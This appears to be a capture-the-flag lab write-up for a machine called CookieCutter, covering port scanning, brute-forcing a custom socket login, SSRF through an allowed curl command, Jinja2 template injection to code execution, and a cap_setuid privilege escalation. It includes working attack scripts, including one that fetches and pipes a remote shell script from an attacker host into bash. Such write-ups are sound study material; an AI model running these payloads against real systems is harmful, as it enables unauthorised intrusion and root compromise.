# CookieCutter

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 3000 192.168.160.112
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-13 14:13 +08
Nmap scan report for 192.168.160.112
Host is up (0.17s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
50000/tcp open  ibm-db2
```

### Web Enumeration --> Brute Force

Port 80 just shows a countdown:

<figure><img src="../../../.gitbook/assets/image (3157).png" alt=""><figcaption></figcaption></figure>

If we view the page source, there's this bit here:

<figure><img src="../../../.gitbook/assets/image (2249).png" alt=""><figcaption></figcaption></figure>

Here's the script:

```python
#!/usr/bin/python3

import socket

HOST="127.0.0.1"
PORT=50000

s = None
def connect():
	global s
	s = socket.socket()
	s.connect((HOST,PORT))

username = b"bob"
password = b"[REDACTED]"

# Example:
# 1\x00admin\x00password\x00
def login():
	connect()
	buf = b""
	buf += b"1"
	buf += b"\x00"
	buf += username
	buf += b"\x00"
	buf += password
	buf += b"\x00"

	s.send(buf)
	r = s.recv(4096)
	data = r.split(b"\x00")

	s.close()
	if int(data[0]) == 1:
		return data[1].decode()
	else:
		return None

# Example:
# 2\x00commands\x00
def send_command(uuid, cmd, *args):
	connect()
	buf = b""
	buf += b"2"
	buf += b"\x00"
	buf += uuid.encode()
	buf += b"\x00"
	buf += cmd.encode()
	buf += b"\x00"
	if args != ():
		for x in args:
			buf += x.encode()
			buf += b"\x00"

	s.send(buf)
	r = s.recv(25600)
	data = r.split(b"\x00")

	s.close()
	if int(data[0]) == 1:
		return data[1].decode()
	else:
		return None

#TODO program some of the example functions that we can show to the client
```

Port 50000 is running an application that uses this script. We know that the user is `bob`, but the password has been removed. As such, we can brute force his password using an adaptation of the original script:

```python
#!/usr/bin/python3

import socket
import base64
import sys
HOST="192.168.160.112"
PORT=50000

username = b"bob"
f = open('/usr/share/wordlists/rockyou.txt','r')
for passw in f:
	attempt = passw.strip('\n').encode()
	print(f"Trying {attempt}...")
	s = socket.socket()
	s.connect((HOST,PORT))
	buf = b""
	buf += b"1"
	buf += b"\x00"
	buf += username
	buf += b"\x00"
	buf += attempt
	buf += b"\x00"
	s.send(buf)
	r = s.recv(4096)
	data = r.split(b"\x00")
	s.close()
	print(data)
```

Eventually, it would find the correct password of `cookie1`.&#x20;

```
Trying b'cookie1'...
[b'1', b'599f7412-54e0-4e7b-9ec3-722d742b9650', b'']
```

Great! Now we can use the original script to interact with the system. I appended a small section here at the bottom:

```python
uuid = login()
cmd = sys.argv[1]
arg = sys.argv[2]
print(send_command(uuid, cmd))
#print(send_command(uuid, cmd, arg))

$ python3 client.py commands
[b'1', b'7cfabad4-e264-442a-9977-88114ef4bbcb', b'']
commands|id|curl
```

It seems that we can only run `id` and `curl`. Since `curl` is open, we can try to read some files or do SSRF. Running curl on `localhost` returns a `base64` encoded string:

```
$ python3 client.py curl http://127.0.0.1        
[b'1', b'a38814c0-fb85-4cdc-abe8-264b5646959c', b'']
PCFET0NUWVBFIGh0bWw+DQo8aHRtbCBsYW5nPSJlbiI+DQo8aGVhZD4NCgk8dGl0bGU+Q29va2llIEN1dHRlciBDb21pb
```

LFI doesn't work, even with `${IFS}`:

```
$ python3 client.py curl '-d${IFS}@/etc/passwd${IFS}http://192.168.45.191' 
ERROR
```

In this case, it means SSRF is the only option. I tested the popular web ports that were open, and found one:

```
$ python3 client.py curl 'http://127.0.0.1:8080'  | base64 -d
<!DOCTYPE html>
<html>
        <head>
                <title>Internal Admin Echo Test</title>
        </head>
        <body>
                <form action="/" method="get">
                        <input type="text" name="echostr" value="Hello World!">
                        <input type="submit" value="Submit">
                </form>
        </body>
</html>
```

Port 8080 hosted an internal admin page that takes a string and echoes it back. I tried some basic SSTI since it was being printed, and it worked:

```python
uuid = login()
cmd = 'curl'
arg = 'http://127.0.0.1:8080/?echostr={{7*7}}'
print(send_command(uuid, cmd, arg))

$ python3 client.py  | base64 -d
<!DOCTYPE html>
<html>
        <head>
                <title>Internal Admin Echo Test</title>
        </head>
        <body>
                <form action="/" method="get">
                        <input type="text" name="echostr" value="Hello World!">
                        <input type="submit" value="Submit">
                </form>
        <p>49</p>
        </body>
</html>
```

We can verify that Jinja2 injections work using `{{config.items()}}`

<figure><img src="../../../.gitbook/assets/image (3889).png" alt=""><figcaption></figcaption></figure>

Using this payload, we can verify the user:

```
{{self.__init__.__globals__.__builtins__.__import__("os").popen("id").read()}}
```

<figure><img src="../../../.gitbook/assets/image (3160).png" alt=""><figcaption></figcaption></figure>

We can get a reverse shell using `curl <IP>/shell.sh|bash`:

<figure><img src="../../../.gitbook/assets/image (3886).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### Password-Check --> Setuid Cap

The user's home directory has an interesting file:

{% code overflow="wrap" %}
```
bob@cookiecutter:~$ ls
local.txt  password_check
bob@cookiecutter:~$ file password_check 
password_check: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=f36f172722b503af6e90af90a690e70b43e9cc01, not stripped
bob@cookiecutter:~$ ./password_check
Segmentation fault (core dumped)
```
{% endcode %}

Using `ltrace` shows a password:

```
bob@cookiecutter:~$ ltrace ./password_check 
strcmp("I_Pr3f3r_C4k3!", nil <no return ...>
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++
```

Using this password, we cannot `su` to `root`, but we can check `sudo` privileges:

```
bob@cookiecutter:~$ sudo -l
[sudo] password for bob: 
Matching Defaults entries for bob on cookiecutter:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User bob may run the following commands on cookiecutter:
    (bob : python_admin) /usr/bin/admin_python3
```

We could run a special type of Python. I wanted to see what was different about this binary, so I used `getcap` and saw that this can run `setuid`:

```
bob@cookiecutter:~$ getcap /usr/bin/admin_python3
/usr/bin/admin_python3 = cap_setuid+ep
```

This means we can make ourselves root using this one-liner:

```python
import os;os.setuid(0);os.system("/bin/bash")
```

<figure><img src="../../../.gitbook/assets/image (3890).png" alt=""><figcaption></figcaption></figure>

## Scripts

Final script for reverse shell:

```python
#!/usr/bin/python3

import socket
import base64
import sys

HOST="192.168.160.112"
PORT=50000

s = None
def connect():
	global s
	s = socket.socket()
	s.connect((HOST,PORT))

username = b"bob"
password = b"cookie1"


# Example:
# 1\x00admin\x00password\x00
def login():
	connect()
	buf = b""
	buf += b"1"
	buf += b"\x00"
	buf += username
	buf += b"\x00"
	buf += password
	buf += b"\x00"

	s.send(buf)
	r = s.recv(4096)
	data = r.split(b"\x00")

	s.close()
	#print (data)
	if int(data[0]) == 1:
		return data[1].decode()
	else:
		return None

# Example:
# 2\x00commands\x00
def send_command(uuid, cmd, *args):
	connect()
	buf = b""
	buf += b"2"
	buf += b"\x00"
	buf += uuid.encode()
	buf += b"\x00"
	buf += cmd.encode()
	buf += b"\x00"
	if args != ():
		for x in args:
			buf += x.encode()
			buf += b"\x00"

	s.send(buf)
	r = s.recv(25600)
	data = r.split(b"\x00")

	s.close()
	if int(data[0]) == 1:
		return data[1].decode()
	else:
		return None

uuid = login()

cmd = 'curl'
arg = 'http://127.0.0.1:8080/?echostr={{self.__init__.__globals__.__builtins__.__import__("os").popen("curl 192.168.45.191/shell.sh|bash").read()}}'
print(send_command(uuid, cmd, arg))
```
